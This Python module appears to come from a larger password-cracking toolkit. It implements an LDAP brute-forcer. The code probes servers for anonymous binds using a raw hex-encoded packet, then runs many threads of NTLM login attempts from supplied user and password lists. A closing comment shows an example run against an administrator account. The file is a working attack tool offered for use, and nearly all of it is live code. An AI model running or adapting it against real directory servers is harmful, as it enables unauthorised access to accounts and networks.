#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
@Author: reber
@Mail: reber0ask@qq.com
@Date: 2019-09-25 21:11:15
@LastEditTime: 2019-12-13 16:33:10
'''

import socket
import binascii
from ldap3 import Server
from ldap3 import Connection
from ldap3 import ALL
from concurrent.futures import ThreadPoolExecutor


class LdapBruteForce(object):
    """LdapBruteForce"""
    def __init__(self, targets, thread_num, timeout):
        super(LdapBruteForce, self).__init__()
        self.targets = targets
        self.thread_num = thread_num
        self.timeout = timeout
        self.unauth_result = list()

    def check_unauth(self,host,port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            data = binascii.a2b_hex("301502010160100201030409416e6f6e796d6f75738000".encode())
            s.send(data)
            result = s.recv(1024)
        except Exception as e:
            print(str(e))
        else:
            if "invalid" in str(result):
                hook_msg((True,host,port,"Anonymous",""))
                self.unauth_result.append(host)
        finally:
            s.close()

    def worker(self,hpup):
        host,port,user,pwd = hpup
        try:
            # 123.123.123.123 389 domain\\user password
            s = Server(host=host, port=port, use_ssl=False, get_info='ALL')
            c = Connection(s, user=user, password=pwd, authentication="NTLM")
            c.bind()
            whoami = c.extend.standard.who_am_i()
        except Exception as e:
            hook_msg((False,host,port,user,pwd))
        else:
            if whoami:
                hook_msg((True,host,port,user,pwd))
        finally:
            s.close()

    def run(self):
        socket.setdefaulttimeout(self.timeout)

        ip_port_list = set([(x[0],x[1]) for x in self.targets])
        for ip,port in ip_port_list:
            self.check_unauth(ip,port)

        with ThreadPoolExecutor(max_workers = self.thread_num) as executor:
            for host,port,user,pwd in self.targets:
                if host not in self.unauth_result:
                    f = executor.submit(self.worker,(host,port,user,pwd))
                # f.add_done_callback(call_back)



#python3 main.py -s ldap -i 10.11.11.18 -l 'reber\\administrator' -p Aa123456. -P 389
bruter = LdapBruteForce

